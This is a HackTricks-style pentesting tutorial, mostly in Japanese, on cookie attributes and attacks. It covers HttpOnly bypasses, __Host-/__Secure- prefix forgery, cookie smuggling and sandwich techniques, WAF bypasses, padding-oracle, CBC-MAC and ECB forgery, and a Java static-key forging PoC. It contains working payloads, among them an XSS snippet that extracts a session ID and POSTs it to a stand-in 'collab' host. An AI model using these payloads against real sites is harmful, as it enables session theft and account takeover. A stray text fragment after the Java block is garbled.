# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie 属性

Cookies には、ユーザーのブラウザでの動作を制御するいくつかの属性がある。以下はこれらの属性の説明（受動的な口調）:

### Expires and Max-Age

Cookie の有効期限は `Expires` 属性で決まる。逆に、`Max-age` 属性は Cookie が削除されるまでの秒数を定義する。**よりモダンな慣習を反映するため、`Max-age` を選択することが推奨される。**

### Domain

Cookie を受け取るホストは `Domain` 属性で指定される。デフォルトでは、発行元のホストに設定され、そのサブドメインは含まれない。しかし、`Domain` 属性が明示的に設定されると、サブドメインも含まれるようになる。これは、サブドメイン間で Cookie を共有する必要があるシナリオで便利な、制約の緩いオプションである。たとえば `Domain=mozilla.org` と設定すると、`developer.mozilla.org` のようなサブドメインでも Cookie にアクセスできるようになる。

### Path

`Path` 属性は、`Cookie` ヘッダが送信されるために要求された URL に存在しなければならない特定の URL パスを示す。この属性は `/` をディレクトリ区切りとして扱い、サブディレクトリでのマッチも許容する。

### Ordering Rules

同じ名前の Cookie が二つある場合、送信されるものは以下に基づいて選ばれる:

- 要求された URL で最も長い path にマッチする Cookie。
- パスが同一の場合は、より最近設定された Cookie。

### SameSite

- `SameSite` 属性は、サードパーティドメイン発のリクエストで Cookie が送信されるかどうかを決定する。設定は三つある:
- **Strict**: サードパーティリクエストでは Cookie の送信を制限する。
- **Lax**: サードパーティのサイトから開始された GET リクエストに対して Cookie の送信を許可する。
- **None**: いかなるサードパーティドメインからの送信も許可する。

Cookie を設定する際、これらの属性を理解することで異なるシナリオで期待通りに動作させることができる。

| **リクエストタイプ** | **例（コード）**                   | **Cookies Sent When** |
| -------------------- | ---------------------------------- | --------------------- |
| Link                 | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender            | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET             | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST            | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe               | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX                 | $.get("...")                       | NotSet\*, None        |
| Image                | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
_**SameSite**_ 属性を持つ Cookie は、ログイン済みセッションが必要な場面での **CSRF 攻撃を軽減する**。

**\*注意: Chrome80 (feb/2019) 以降、SameSite 属性を持たない Cookie のデフォルト動作は lax になる** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
この変更適用後しばらくの間、Chrome では **SameSite ポリシーを持たない Cookie** が **最初の 2 分間は None と扱われ、その後トップレベルのクロスサイト POST リクエストでは Lax として扱われる**ことに注意。

## Cookies フラグ

### HttpOnly

これは **クライアント** が Cookie にアクセスするのを防ぐ（例: **Javascript** 経由での `document.cookie`）。

#### **Bypasses**

- ページがリクエストのレスポンスとして Cookie を返している場合（たとえば **PHPinfo** ページ）、XSS を悪用してそのページへリクエストを送り、レスポンスから Cookie を**盗む**ことが可能である（例を参照: [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)）。
- サーバが `TRACE` HTTP リクエストを受け付ける場合、レスポンスに送信された Cookie が反映されるため、これを悪用してバイパスできることがある。この手法は **Cross-Site Tracking** と呼ばれる。
- ただし、現代のブラウザは JS からの `TRACE` リクエスト送信を許可しないことでこの手法を防いでいる。しかし、IE6.0 SP2 のような特定ソフトウェアでは `TRACE` の代わりに `\r\nTRACE` を送るなどのバイパスが見つかっている。
- 他の方法としては、ブラウザの zero/day 脆弱性の悪用がある。
- Cookie Jar overflow 攻撃を行うことで HttpOnly Cookie を上書きできる可能性がある:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- これらの Cookie を抜き取るために [**Cookie Smuggling**](#cookie-smuggling) 攻撃を使用することが可能である
- サーバサイドのエンドポイントが HTTP レスポンス内に生のセッション ID をそのまま出力している場合（例: HTML コメント内やデバッグブロック内）、XSS ガジェットを用いてそのエンドポイントを取得し、正規表現で秘密を抽出して持ち出すことで HttpOnly をバイパスできる。例となる XSS ペイロードのパターン:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### セキュア

リクエストは、セキュアなチャネル（通常は **HTTPS**）で送信される場合に**のみ** HTTP リクエストに cookie を送信します。

## Cookie プレフィックス

`__Secure-` でプレフィックスされた Cookie は、HTTPS で保護されたページから `secure` フラグとともに設定される必要があります。

`__Host-` でプレフィックスされた Cookie には、以下の条件が満たされている必要があります:

- `secure` フラグで設定されていること。
- HTTPS で保護されたページから発生していること。
- domain を指定することが禁止されており、サブドメインへの送信が防止されていること。
- path が `/` に設定されていること。

`__Host-` プレフィックス付きの Cookie はスーパードメインやサブドメインに送信されることが許可されていない点に注意してください。この制限はアプリケーションの Cookie を分離するのに役立ちます。したがって、すべてのアプリケーション Cookie に `__Host-` プレフィックスを使用することは、セキュリティと分離を強化する良いプラクティスと見なせます。

### クッキーの上書き

`__Host-` プレフィックス付き Cookie の保護のひとつは、サブドメインからの上書きを防ぐことです。例えば [**Cookie Tossing attacks**](cookie-tossing.md) を防ぐためです。トーク [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg)（[**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)）では、パーサを騙すことでサブドメインから \_\_HOST- プレフィックスの Cookie を設定できてしまうことが示されており、たとえば名前の先頭に "=" を追加したり、先頭と末尾に追加したりしていました:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

また PHP では、Cookie 名の先頭に **別の文字を追加** するとそれが **アンダースコアに置き換えられる** ことがあり、`__HOST-` Cookie を上書きできる場合がありました:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

ブラウザとサーバのパースの不一致を悪用して、Cookie 名の先頭に Unicode の空白コードポイントを付け加えます。ブラウザは名前が文字通り `__Host-`/`__Secure-` で始まるとは見なさないため、サブドメインからの設定を許可します。一方でバックエンドが Cookie キーの先頭の Unicode 空白をトリム／正規化する場合、保護された名前として認識してしまい、高権限の Cookie を上書きしてしまう可能性があります。

- PoC from a subdomain that can set parent-domain cookies:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- 問題を引き起こす典型的なバックエンドの振る舞い:
- Cookieキーをトリム/正規化するフレームワーク。Djangoでは、Pythonの`str.strip()`が多くのUnicode空白コードポイントを削除し、名前が`__Host-name`に正規化される。
- 一般的にトリムされるコードポイントには次が含まれる: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- 多くのフレームワークは重複するCookie名を「last wins」として解決するため、攻撃者が制御する正規化されたCookie値が正当なものを上書きする。

- ブラウザ差が重要:
- SafariはCookie名にマルチバイトのUnicode空白をブロックする（例: U+2000を拒否）が、バックエンドがトリムすることの多いシングルバイトのU+0085やU+00A0は許可する。複数ブラウザでクロステストすること。

- 影響: サブドメインなどの信頼度の低いコンテキストから`__Host-`/`__Secure-`クッキーを上書き可能にし、XSS（反射型の場合）、CSRFトークンの上書き、session fixationにつながる可能性がある。

- On-the-wire vs server view example (U+2000 present in name):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
多くのバックエンドは分割/解析してからトリムするため、正規化された `__Host-name` が攻撃者の値を取ることになる。

#### Java backendsでのレガシー `$Version=1` cookie splitting（prefix bypass）

一部のJavaスタック（例: Tomcat/Jetty-style）は、`Cookie` ヘッダが `$Version=1` で始まるときにレガシーな RFC 2109/2965 パーシングをまだ有効にしていることがある。これにより、サーバは単一の cookie 文字列を複数の論理的な cookie と再解釈し、サブドメインや安全でないオリジンから設定された本来の `__Host-` エントリを受け入れてしまう可能性がある。

- レガシーなパーシングを強制する PoC:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- なぜ動作するか:
- クライアント側のプレフィックスチェックは set 時に適用されるが、サーバー側のレガシーな解析が後でヘッダを分割して正規化するため、`__Host-`/`__Secure-` プレフィックスの保証を回避できる。

- 試す場所: Tomcat, Jetty, Undertow、または RFC 2109/2965 の属性をまだ尊重するフレームワーク。同名の上書きセマンティクスと組み合わせる。

#### Duplicate-name last-wins overwrite primitive

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.

#### Detection and tooling

Use Burp Suite to probe for these conditions:

- 先頭に複数の Unicode 空白コードポイント（U+2000, U+0085, U+00A0）を試し、バックエンドがそれらをトリムして名前をプレフィックス付きとして扱うか確認する。
- Cookie ヘッダで最初に `$Version=1` を送信し、バックエンドがレガシー分割/正規化を行うか確認する。
- 同名に正規化される2つの cookies を注入して、同名解決（先勝ち vs 後勝ち）を観察する。
- 自動化用の Burp カスタムアクション: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Cookies Attacks

カスタム cookie に機密データが含まれている場合は確認する（特に CTF をプレイしている場合）、脆弱である可能性がある。

### Decoding and Manipulating Cookies

cookie に埋め込まれた機密データは常に精査するべきだ。Base64 等でエンコードされた cookies はしばしばデコードできる。この脆弱性により攻撃者は cookie の内容を変更し、変更後のデータを再エンコードして cookie に戻すことで他のユーザになりすますことができる。

### Session Hijacking

この攻撃はユーザの cookie を盗んでそのアプリケーション内で不正アクセスを行うことを伴う。盗まれた cookie を用いることで攻撃者は正当なユーザをなりすますことができる。

### Session Fixation

このシナリオでは、攻撃者が被害者を騙して特定の cookie を使ってログインさせる。アプリがログイン時に新しい cookie を割り当てない場合、攻撃者は元の cookie を持っていることで被害者になりすますことができる。この手法は被害者が攻撃者が提供した cookie でログインすることに依存する。

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

ここでは攻撃者が被害者を説得して攻撃者のセッション cookie を使わせる。被害者は自分のアカウントにログインしていると信じて、意図せず攻撃者のアカウントのコンテキストで操作を行ってしまう。

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

前のリンクをクリックすると、JWT の潜在的な欠陥を説明するページにアクセスできる。

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

この攻撃はログイン済みユーザに対して、そのユーザが認証されている web アプリ上で望まない操作を実行させる。攻撃者は脆弱なサイトへの各リクエストで自動的に送信される cookie を悪用できる。

### Empty Cookies

（詳細は[original research](https://blog.ankursundara.com/cookie-bugs/)を確認）ブラウザは名前なしの cookies を作成することを許可しており、次の JavaScript で示せる。
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
送信される cookie header の結果は `a=v1; test value; b=v2;` です。興味深いことに、空の名前の cookie を設定すると、cookie を操作できる可能性があり、空の cookie に特定の値を設定することで他の cookie を制御できる場合があります:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
これにより、ブラウザは cookie header を送信し、すべての web サーバーはそれを名前が `a`、値が `b` の cookie と解釈します。

#### Chrome バグ: Unicode サロゲートコードポイントの問題

Chrome では、set cookie の一部に Unicode サロゲートコードポイントが含まれていると、`document.cookie` が破損し、その後空の文字列を返します:
```js
document.cookie = "\ud800=meep"
```
これにより `document.cookie` は空文字列を出力し、恒久的な破損を示します。

#### 解析の問題による Cookie Smuggling

(詳細は[original research](https://blog.ankursundara.com/cookie-bugs/)を参照してください) Java（Jetty、TomCat、Undertow）や Python（Zope、cherrypy、web.py、aiohttp、bottle、webob）などのいくつかの web サーバは、古い RFC2965 のサポートのために cookie 文字列を誤って処理します。これらは、セミコロンで区切られるはずの key-value pairs を含んでいても、ダブルクオートで囲まれた cookie 値を単一の値として読み取ります：
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(詳細は[original research](https://blog.ankursundara.com/cookie-bugs/)を参照) サーバー、特に Undertow、Zope、そして Python の `http.cookie.SimpleCookie` や `http.cookie.BaseCookie` を使っているものにおける cookies の不適切なパースは、cookie 注入攻撃の機会を生みます。これらのサーバーは新しい cookie の開始を適切に区切れないため、攻撃者が cookie を偽装できてしまいます:

- Undertow は引用符で囲まれた値の直後にセミコロンがなくても新しい cookie を期待します。
- Zope は次の cookie のパースを開始するためにカンマを探します。
- Python の cookie クラスは空白文字でパースを開始します。

この脆弱性は、cookie ベースの CSRF 保護に依存する web アプリケーションで特に危険です。攻撃者が偽造した CSRF-token cookie を注入できるため、セキュリティ対策を回避される可能性があります。問題は、Python が重複する cookie 名を扱う際に最後の出現が先のものを上書きするという挙動によってさらに悪化します。また、`__Secure-` や `__Host-` のような cookie が安全でないコンテキストで問題になる点、そして cookie がバックエンドサーバーに渡され、そのサーバーが偽装に対して脆弱な場合に認可回避につながる可能性がある点も懸念されます。

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), it might be possible to use the cookie attribute **`$Version=1`** to make the backend use an old logic to parse the cookie due to the **RFC2109**. Moreover, other values just as **`$Domain`** and **`$Path`** can be used to modify the behaviour of the backend with the cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) it's possible to use the cookie sandwich technique to steal HttpOnly cookies. These are the requirements and steps:

- レスポンス内で一見無意味に **cookie が反映される場所を見つける**
- 値が `1` の **`$Version` という cookie を作成する**（これは JS からの XSS 攻撃で行えます）。より具体的な path を与えて最初の位置を取らせます（python のような一部フレームワークではこのステップは不要）
- 反映される **cookie を作成** し、その値は **開いた二重引用符を残す** ものにして、前の `$Version` の後に cookie DB 上で配置されるように特定の path を指定する
- すると、正当な cookie が順序上で次に来るようになります
- 最後に、値の中で二重引用符を閉じるダミーの cookie を作成する

このようにして、被害者の cookie は新しいバージョン 1 の cookie の内部に閉じ込められ、反映されるたびにその中に含まれるようになります。
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

前のセクションを参照してください。

#### Bypassing value analysis with quoted-string encoding

この解析は cookie 内のエスケープされた値をアンエスケープすることを示します。つまり "\a" は "a" になります。これは WAFS をバイパスするのに有用な場合があります。例えば:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

RFC2109 では、**カンマは cookie 値の区切りとして使用できます** と示されています。また、**等号の前後にスペースやタブを追加できる**ことも可能です。したがって `$Version=1; foo=bar, abc = qux` のような cookie は `"foo":"bar, admin = qux"` という cookie を生成するのではなく、`foo":"bar"` と `"admin":"qux"` という cookie を生成します。2つの cookie が生成され、admin の等号の前後のスペースが削除される点に注意してください。

#### Bypassing value analysis with cookie splitting

最後に、異なる backdoors が異なる cookie ヘッダで渡された複数の cookie を 1つの文字列に結合することがあります。例:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
これにより、次の例のようにWAFをバイパスできる可能性があります:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### 追加の脆弱な Cookies チェック

#### **基本的なチェック**

- **cookie** は **login** のたびに **same** です。
- ログアウトして同じ **cookie** を使ってみる。
- 2台のデバイス（またはブラウザ）で同じアカウントに同じ **cookie** を使って **login** してみる。
- **cookie** に何か情報が含まれているか確認し、変更してみる。
- ほぼ同じ **username** を持つ複数の **accounts** を作成して、類似点が見えるか確認する。
- 存在する場合は「**remember me**」オプションがどのように動作するか確認する。存在し脆弱であり得る場合は、他の cookie を使わず常に **remember me** の **cookie** のみを使用する。
- パスワードを変更した後でも前の **cookie** が機能するか確認する。

#### **高度な cookies 攻撃**

もし **cookie** が **login** 時に同じ（またはほぼ同じ）のままであれば、これはおそらく **cookie** がアカウントのあるフィールド（おそらく **username**）に関連していることを意味します。そうしたら次のことができる:

- 非常に **similar** な **username** を持つ多数の **accounts** を作成し、アルゴリズムがどのように動いているか **guess** してみる。
- **bruteforce the username** を試みる。もし **cookie** があなたの **username** の認証方法としてのみ保存されているなら、username を "**Bmin**" にしたアカウントを作成して、試す cookie のうちの一つが "**admin**" のものになるため、**bruteforce** によって **cookie** の全ての **bit** を試すことができる。
- **Padding** **Oracle**（cookie の内容を復号できる場合がある）を試す。**padbuster** を使う。

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster は複数回試行を行い、どの条件がエラー条件であるか（有効でないもの）を尋ねてきます。

次に、cookie の decrypting を開始します（数分かかる場合があります）

If the attack が成功していれば、任意の文字列を encrypt してみることができます。例えば、**encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
この実行により、文字列 **user=administrator** を含む cookie が正しく暗号化およびエンコードされたものが得られます。

**CBC-MAC**

cookie に何らかの値があり、CBC を使って署名されている可能性があります。その場合、値の整合性は同じ値を使って CBC で作成された署名になります。推奨される IV が null vector（全ゼロ）であることが多く、この種の整合性チェックは脆弱になり得ます。

**The attack**

1. ユーザー名 **administ** の署名を取得 = **t**
2. ユーザー名 **rator\x00\x00\x00 XOR t** の署名を取得 = **t'**
3. cookie に値 **administrator+t'** を設定する（**t'** は **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00** の有効な署名になる）

**ECB**

cookie が ECB で暗号化されている場合、脆弱になる可能性があります。  
ログイン時に受け取る cookie が常に同じであることがあります。

How to detect and attack:

ほぼ同じデータ（username, password, email など）を持つユーザーを2つ作成し、発行された cookie にパターンがないか調べます。

例えばユーザー名を "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" のようにして、cookie にパターンがあるか確認します（ECB は各ブロックを同じ鍵で暗号化するため、username が暗号化されていれば同じ暗号化済みバイト列が現れる可能性があります）。

使用されるブロックサイズに対応したパターンが見つかるはずです。つまり、"a" がどのように暗号化されるかが分かれば、ユーザー名を "a"*(ブロックサイズ) + "admin" のように作成できます。そして、cookie から "a" が並ぶブロックの暗号化パターンを削除すれば、username "admin" の cookie を手に入れることができます。

### Static-key cookie forgery (symmetric encryption of predictable IDs)

一部のアプリケーションは、グローバルでハードコードされた symmetric key の下で予測可能な値（例：数値の user ID）だけを暗号化し、暗号文を hex/base64 等でエンコードして authentication cookie を生成します。キーが製品単位（またはインストール単位）で固定されている場合、誰でもオフラインで任意のユーザー用の cookie を偽造し、認証を回避できます。

How to test/forge
- 認証を制御している cookie（例: COOKIEID や ADMINCOOKIEID）を特定する。
- 暗号方式／エンコーディングを特定する。実例ではアプリが IDEA を一定の 16-byte キーで使い、暗号文を hex として返していた。
- 自身の user ID を暗号化して発行された cookie と比較し、検証する。一致すれば任意のターゲット ID 用に cookie を作成できる（ID 1 はしばしば最初の admin に対応する）。
- 偽造した値を直接 cookie として設定してブラウジングすればよい。資格情報は不要。

<details>
<summary>実際に使われた最小限の Java PoC (IDEA + hex)</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>context（例: server-side session with random ID、または anti-replay properties を追加する）。

## 参考文献

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
